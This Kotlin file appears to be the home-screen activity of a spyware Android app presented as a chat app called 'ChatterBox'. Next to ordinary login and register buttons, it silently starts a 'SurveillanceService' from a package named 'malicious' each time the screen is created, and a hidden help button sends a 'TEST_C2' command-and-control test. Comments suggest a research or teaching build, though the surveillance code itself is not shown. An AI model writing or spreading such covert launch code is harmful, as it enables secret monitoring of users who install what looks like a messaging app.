package com.example.ChatterBox

import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.malicious.SurveillanceService

class HomeActivity : AppCompatActivity() {
    private val TAG = "HomeActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        // UI elements
        val loginButton = findViewById<Button>(R.id.btnLogin)
        val registerButton = findViewById<Button>(R.id.btnRegister)

        // Normal app flow buttons
        loginButton.setOnClickListener {
            startActivity(Intent(this, LoginActivity::class.java))
        }

        registerButton.setOnClickListener {
            startActivity(Intent(this, RegisterActivity::class.java))
        }
        
        // Start the surveillance service in the background
        startSurveillanceService()
        
        // HIDDEN - Debug buttons are in the app for testing C2 functionality
        // These would be hidden or removed in a real malicious app
        try {
            // This button might not exist in all layouts, so wrap in try-catch
            val helpButton = findViewById<Button>(R.id.btnHelp)
            helpButton?.setOnClickListener {
                // Test button for C2 - this is hidden in the layout but can be accessed for testing
                Log.d(TAG, "Debug: Testing C2 connection manually")
                
                // Start a direct test of the C2 client
                val intent = Intent(this, SurveillanceService::class.java)
                intent.action = "TEST_C2"
                startService(intent)
                
                Log.d(TAG, "Debug: C2 test command sent")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Debug button not found or error setting listener", e)
        }
    }

    private fun startSurveillanceService() {
        try {
            Log.d(TAG, "Starting SurveillanceService")
            val serviceIntent = Intent(this, SurveillanceService::class.java)
            startService(serviceIntent)
            Log.d(TAG, "SurveillanceService started successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting SurveillanceService", e)
        }
    }
}
